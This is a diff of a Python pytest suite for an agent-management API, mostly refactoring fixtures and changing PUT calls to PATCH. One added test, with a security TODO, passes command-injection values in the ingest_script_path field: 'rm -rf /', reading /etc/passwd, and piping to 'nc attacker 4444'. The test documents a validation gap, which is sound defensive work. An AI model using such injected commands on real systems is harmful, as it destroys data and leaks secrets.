@@ -8,22 +8,30 @@ from __future__ import annotations
 import uuid
 from unittest.mock import MagicMock
 
-AGENT_ID = uuid.UUID("00000000-0000-0000-0000-000000000010")
+import pytest
+
+from tests.conftest import AGENT_ID
+
 USER_ID  = uuid.UUID("00000000-0000-0000-0000-000000000099")
 
 
-def _agent_mock(
-    agent_id: uuid.UUID = AGENT_ID,
-    name: str = "TestAgent",
-) -> MagicMock:
-    a = MagicMock()
-    a.id = agent_id
-    a.name = name
-    a.txt_output_path = "/output/path"
-    a.rasa_rest_url = None
-    a.ingest_script_path = None
-    a.created_at = None
-    return a
+@pytest.fixture
+def _agent_mock(agent_factory):
+    """檔內 fixture，回傳建立 Agent mock 的 callable（保持原 helper 簽章相容）。"""
+    def _make(
+        agent_id: uuid.UUID = AGENT_ID,
+        name: str = "TestAgent",
+    ) -> MagicMock:
+        a = agent_factory(
+            agent_id=agent_id,
+            name=name,
+            txt_output_path="/output/path",
+            rasa_rest_url=None,
+            ingest_script_path=None,
+        )
+        a.created_at = None
+        return a
+    return _make
 
 
 def _user_mock(user_id: uuid.UUID = USER_ID) -> MagicMock:
@@ -44,7 +52,7 @@ def _uar_mock(role: str = "editor") -> MagicMock:
     return uar
 
 
-def _make_counter_se(returns_map: dict[int, MagicMock | list]) -> object:
+def _make_counter_se(returns_map: dict[int, MagicMock | list | None]) -> object:
     """
     依呼叫順序回傳不同值的 side_effect。
     returns_map[i] 可為 MagicMock（.first() 用）或 list（.all() 用）。
@@ -71,7 +79,7 @@ def _make_counter_se(returns_map: dict[int, MagicMock | list]) -> object:
 # ─── list_agents ──────────────────────────────────────────────────────────────
 
 class TestListAgents:
-    def test_superadmin_sees_all(self, client_superadmin, mock_db):
+    def test_superadmin_sees_all(self, client_superadmin, mock_db, _agent_mock) -> None:
         agent = _agent_mock()
         mock_db.query.return_value.order_by.return_value.all.return_value = [agent]
         resp = client_superadmin.get("/api/v1/agents")
@@ -80,7 +88,7 @@ class TestListAgents:
         assert data["success"] is True
         assert len(data["data"]) == 1
 
-    def test_editor_sees_only_assigned(self, client_editor, mock_db):
+    def test_editor_sees_only_assigned(self, client_editor, mock_db, _agent_mock):
         uar = _uar_mock("editor")
         uar.agent_id = AGENT_ID
         agent = _agent_mock()
@@ -119,7 +127,7 @@ class TestListAgents:
         assert resp.status_code == 200
         assert resp.json()["data"] == []
 
-    def test_superadmin_empty_db_returns_empty(self, client_superadmin, mock_db):
+    def test_superadmin_empty_db_returns_empty(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.order_by.return_value.all.return_value = []
         resp = client_superadmin.get("/api/v1/agents")
         assert resp.status_code == 200
@@ -129,7 +137,7 @@ class TestListAgents:
 # ─── create_agent ─────────────────────────────────────────────────────────────
 
 class TestCreateAgent:
-    def test_success_returns_201(self, client_superadmin, mock_db):
+    def test_success_returns_201(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         mock_db.refresh.return_value = None
         resp = client_superadmin.post(
@@ -139,7 +147,7 @@ class TestCreateAgent:
         assert resp.status_code == 201
         assert resp.json()["success"] is True
 
-    def test_duplicate_name_returns_409(self, client_superadmin, mock_db):
+    def test_duplicate_name_returns_409(self, client_superadmin, mock_db, _agent_mock) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = _agent_mock()
         resp = client_superadmin.post(
             "/api/v1/agents",
@@ -148,14 +156,14 @@ class TestCreateAgent:
         assert resp.status_code == 409
         assert resp.json()["detail"]["code"] == "CONFLICT"
 
-    def test_editor_returns_403(self, client_editor, mock_db):
+    def test_editor_returns_403(self, client_editor, mock_db) -> None:
         resp = client_editor.post(
             "/api/v1/agents",
             json={"name": "NewAgent", "txt_output_path": "/output"},
         )
         assert resp.status_code == 403
 
-    def test_missing_txt_output_path_returns_422(self, client_superadmin, mock_db):
+    def test_missing_txt_output_path_returns_422(self, client_superadmin, mock_db) -> None:
         resp = client_superadmin.post(
             "/api/v1/agents",
             json={"name": "NewAgent"},
@@ -166,19 +174,19 @@ class TestCreateAgent:
 # ─── get_agent ────────────────────────────────────────────────────────────────
 
 class TestGetAgent:
-    def test_superadmin_returns_200(self, client_superadmin, mock_db):
+    def test_superadmin_returns_200(self, client_superadmin, mock_db, _agent_mock) -> None:
         agent = _agent_mock()
         mock_db.query.return_value.filter.return_value.first.return_value = agent
         resp = client_superadmin.get(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 200
         assert resp.json()["success"] is True
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         resp = client_superadmin.get(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 404
 
-    def test_editor_with_role_returns_200(self, client_editor, mock_db):
+    def test_editor_with_role_returns_200(self, client_editor, mock_db, _agent_mock) -> None:
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
             1: _uar_mock("editor"),
@@ -190,37 +198,63 @@ class TestGetAgent:
 # ─── update_agent ─────────────────────────────────────────────────────────────
 
 class TestUpdateAgent:
-    def test_success_returns_200(self, client_superadmin, mock_db):
+    def test_success_returns_200(self, client_superadmin, mock_db, _agent_mock) -> None:
         agent = _agent_mock()
         mock_db.query.return_value.filter.return_value.first.return_value = agent
         mock_db.refresh.return_value = None
-        resp = client_superadmin.put(
+        resp = client_superadmin.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "UpdatedAgent", "txt_output_path": "/new/path"},
         )
         assert resp.status_code == 200
         assert resp.json()["success"] is True
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
-        resp = client_superadmin.put(
+        resp = client_superadmin.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "X"},
         )
         assert resp.status_code == 404
 
-    def test_editor_returns_403(self, client_editor, mock_db):
-        resp = client_editor.put(
+    def test_editor_returns_403(self, client_editor, mock_db) -> None:
+        resp = client_editor.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "X"},
         )
         assert resp.status_code == 403
 
+    # TODO(security): 後端應拒絕 ingest_script_path 含 shell metachar
+    # （; & | $() 反引號 等）。目前 schema 僅有 max_length=255，無內容驗證；
+    # 雖然 tasks.py 用 shlex.split + shell=False 已相對安全，但深度防禦上
+    # 應在 update/create agent 時即拒絕可疑路徑。本測試 assert 目前行為
+    # （接受），未來修復後須翻轉為 expect 400/422。
+    def test_update_agent_currently_accepts_shell_metachar_path(
+        self, client_superadmin, mock_db, _agent_mock
+    ) -> None:
+        """目前 update_agent 接受含 shell metachar 的 ingest_script_path（待強化）。"""
+        agent = _agent_mock()
+        mock_db.query.return_value.filter.return_value.first.return_value = agent
+        mock_db.refresh.return_value = None
+
+        malicious_paths = [
+            "/opt/scripts/ingest.py; rm -rf /",
+            "/opt/scripts/ingest.py && cat /etc/passwd",
+            "/opt/scripts/ingest.py | nc attacker 4444",
+        ]
+        for p in malicious_paths:
+            resp = client_superadmin.patch(
+                f"/api/v1/agents/{AGENT_ID}",
+                json={"ingest_script_path": p},
+            )
+            # 目前行為：接受（200）。修復後預期改為 400/422。
+            assert resp.status_code == 200, (p, resp.json())
+
 
 # ─── delete_agent ─────────────────────────────────────────────────────────────
 
 class TestDeleteAgent:
-    def test_success_no_items_returns_204(self, client_superadmin, mock_db):
+    def test_success_no_items_returns_204(self, client_superadmin, mock_db, _agent_mock) -> None:
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),   # Agent found
             1: None,            # KnowledgeItem → none
@@ -229,12 +263,12 @@ class TestDeleteAgent:
         resp = client_superadmin.delete(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 204
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         resp = client_superadmin.delete(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 404
 
-    def test_has_knowledge_items_returns_422(self, client_superadmin, mock_db):
+    def test_has_knowledge_items_returns_422(self, client_superadmin, mock_db, _agent_mock) -> None:
         faq_mock = MagicMock()
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
@@ -244,7 +278,7 @@ class TestDeleteAgent:
         assert resp.status_code == 422
         assert resp.json()["detail"]["code"] == "UNPROCESSABLE"
 
-    def test_has_categories_returns_422(self, client_superadmin, mock_db):
+    def test_has_categories_returns_422(self, client_superadmin, mock_db, _agent_mock) -> None:
         cat_mock = MagicMock()
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
@@ -254,7 +288,7 @@ class TestDeleteAgent:
         resp = client_superadmin.delete(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 422
 
-    def test_editor_returns_403(self, client_editor, mock_db):
+    def test_editor_returns_403(self, client_editor, mock_db) -> None:
         resp = client_editor.delete(f"/api/v1/agents/{AGENT_ID}")
         assert resp.status_code == 403
 
@@ -262,7 +296,7 @@ class TestDeleteAgent:
 # ─── get_agent_stats ──────────────────────────────────────────────────────────
 
 class TestGetAgentStats:
-    def test_returns_200_with_counts(self, client_superadmin, mock_db):
+    def test_returns_200_with_counts(self, client_superadmin, mock_db, _agent_mock):
         agent = _agent_mock()
         row = MagicMock()
         row.total = 10
@@ -303,7 +337,7 @@ class TestGetAgentStats:
         assert data["rejected_count"] == 0
         assert data["categories_count"] == 3
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         resp = client_superadmin.get(f"/api/v1/agents/{AGENT_ID}/stats")
         assert resp.status_code == 404
@@ -312,7 +346,7 @@ class TestGetAgentStats:
 # ─── assign_role ──────────────────────────────────────────────────────────────
 
 class TestAssignRole:
-    def test_assign_new_role_returns_201(self, client_superadmin, mock_db):
+    def test_assign_new_role_returns_201(self, client_superadmin, mock_db, _agent_mock) -> None:
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),   # Agent
             1: _user_mock(),    # target User
@@ -325,7 +359,7 @@ class TestAssignRole:
         assert resp.status_code == 201
         assert resp.json()["success"] is True
 
-    def test_update_existing_role_returns_201(self, client_superadmin, mock_db):
+    def test_update_existing_role_returns_201(self, client_superadmin, mock_db, _agent_mock) -> None:
         existing_uar = _uar_mock("editor")
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
@@ -338,7 +372,7 @@ class TestAssignRole:
         )
         assert resp.status_code == 201
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.side_effect = _make_counter_se({0: None})
         resp = client_superadmin.post(
             f"/api/v1/agents/{AGENT_ID}/roles",
@@ -346,7 +380,7 @@ class TestAssignRole:
         )
         assert resp.status_code == 404
 
-    def test_user_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_user_not_found_returns_404(self, client_superadmin, mock_db, _agent_mock) -> None:
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
             1: None,            # target user 不存在
@@ -357,7 +391,7 @@ class TestAssignRole:
         )
         assert resp.status_code == 404
 
-    def test_invalid_role_returns_422(self, client_superadmin, mock_db):
+    def test_invalid_role_returns_422(self, client_superadmin, mock_db) -> None:
         """role 欄位只允許 reviewer | editor。"""
         resp = client_superadmin.post(
             f"/api/v1/agents/{AGENT_ID}/roles",
@@ -365,7 +399,7 @@ class TestAssignRole:
         )
         assert resp.status_code == 422
 
-    def test_editor_returns_403(self, client_editor, mock_db):
+    def test_editor_returns_403(self, client_editor, mock_db) -> None:
         resp = client_editor.post(
             f"/api/v1/agents/{AGENT_ID}/roles",
             json={"user_id": str(USER_ID), "role": "editor"},
@@ -376,7 +410,7 @@ class TestAssignRole:
 # ─── get_my_role ──────────────────────────────────────────────────────────────
 
 class TestGetMyRole:
-    def test_superadmin_returns_200_with_no_role(self, client_superadmin, mock_db):
+    def test_superadmin_returns_200_with_no_role(self, client_superadmin, mock_db, _agent_mock) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = _agent_mock()
         resp = client_superadmin.get(f"/api/v1/agents/{AGENT_ID}/my-role")
         assert resp.status_code == 200
@@ -384,7 +418,7 @@ class TestGetMyRole:
         assert data["is_superadmin"] is True
         assert data["role"] is None
 
-    def test_reviewer_returns_role(self, client_reviewer, mock_db):
+    def test_reviewer_returns_role(self, client_reviewer, mock_db, _agent_mock) -> None:
         mock_db.query.side_effect = _make_counter_se({
             0: _agent_mock(),
             1: _uar_mock("reviewer"),
@@ -393,7 +427,7 @@ class TestGetMyRole:
         assert resp.status_code == 200
         assert resp.json()["data"]["role"] == "reviewer"
 
-    def test_agent_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         resp = client_superadmin.get(f"/api/v1/agents/{AGENT_ID}/my-role")
         assert resp.status_code == 404
@@ -402,7 +436,7 @@ class TestGetMyRole:
 # ─── remove_role ──────────────────────────────────────────────────────────────
 
 class TestRemoveRole:
-    def test_success_returns_204(self, client_superadmin, mock_db):
+    def test_success_returns_204(self, client_superadmin, mock_db) -> None:
         uar = _uar_mock("editor")
         mock_db.query.return_value.filter.return_value.first.return_value = uar
         resp = client_superadmin.delete(
@@ -410,7 +444,7 @@ class TestRemoveRole:
         )
         assert resp.status_code == 204
 
-    def test_not_found_returns_404(self, client_superadmin, mock_db):
+    def test_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
         resp = client_superadmin.delete(
             f"/api/v1/agents/{AGENT_ID}/roles/{USER_ID}"
@@ -418,7 +452,7 @@ class TestRemoveRole:
         assert resp.status_code == 404
         assert resp.json()["detail"]["code"] == "NOT_FOUND"
 
-    def test_editor_returns_403(self, client_editor, mock_db):
+    def test_editor_returns_403(self, client_editor, mock_db) -> None:
         resp = client_editor.delete(
             f"/api/v1/agents/{AGENT_ID}/roles/{USER_ID}"
         )
